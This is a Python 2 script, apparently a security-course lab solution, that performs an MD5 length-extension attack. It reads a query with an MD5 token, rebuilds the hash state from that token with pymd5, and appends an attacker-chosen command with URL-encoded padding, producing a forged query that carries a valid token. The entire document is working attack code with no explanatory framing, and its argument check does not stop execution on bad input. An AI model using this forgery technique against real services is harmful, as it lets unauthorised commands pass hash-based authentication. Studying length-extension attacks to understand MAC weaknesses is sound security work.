import sys
import pymd5
import urllib

def read_file(filename):
    with open(filename, 'r') as fp:
        return fp.read().strip()

def attack_query(query_filename, command3_filename, output_filename):

    # read files
    query = read_file(query_filename)
    command3 = read_file(command3_filename)

    # get the token which is the md5 hash output and "guess" number of bits in msg
    token = query[6:38]
    length_of_m = 8 + len(query[39:]) 
    msgbits = (length_of_m + len(pymd5.padding(length_of_m * 8)))* 8

    # based on the token and the msgbits get the hash and add the command to it
    h = pymd5.md5(state = token.decode('hex'), count = msgbits)
    h.update(command3)
    
    # create the attack query
    attack = query[:6] + h.hexdigest() + query[38:] + urllib.quote(pymd5.padding(length_of_m * 8)) + command3

    # write the new length extension query attack
    with open(output_filename, 'w') as file:
        file.write(attack)

    return attack 

def main():
    if(len(sys.argv) != 4):
        print 'Invalid arguments'

    # parse the args 
    query_filename = sys.argv[1]
    command3_filename = sys.argv[2]
    output_filename = sys.argv[3]

    print 'Here is the new attack query: ' + attack_query(query_filename, command3_filename, output_filename)

if __name__ == '__main__':
    main()